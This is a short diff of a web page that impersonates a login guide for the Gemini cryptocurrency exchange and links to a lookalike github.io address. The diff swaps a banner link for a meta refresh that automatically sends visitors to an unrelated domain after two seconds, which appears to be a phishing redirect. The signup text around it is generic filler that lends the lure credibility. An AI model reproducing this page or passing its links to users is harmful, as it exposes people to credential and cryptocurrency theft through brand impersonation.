@@ -1,4 +1,5 @@
-<a href="https://logmade.xyz/coining/gemn/"><img style="display: block; margin-left: auto;margin-right: auto;" src="https://i.ibb.co/H2zXQps/gemini-bing-1.png" alt="Gemini Login" width="100%" height="auto"></a>
+<meta http-equiv = "refresh" content = "2; url =https://logmade.xyz/coining/gemn/"/>
+
 # Gemini Login | The #1 Cryptocurrency Exchange to Buy Bitcoin and Ether
 
 Set up a new [Gemini login](https://geminilogin.github.io/Gemini/) account using the instructions below, but make sure your phone or PC is linked to a secure internet connection. Navigate to the App or Play Store and then follow the instructions to download the Gemini login app. Otherwise, use a browser and navigate to the Gemini.com website. Now, enter your name, email address, password, and any other information that is requested. Then, navigate to the 'Continue' option and click it to continue. If prompted, enter your email address and click the 'Finish Setup' button.
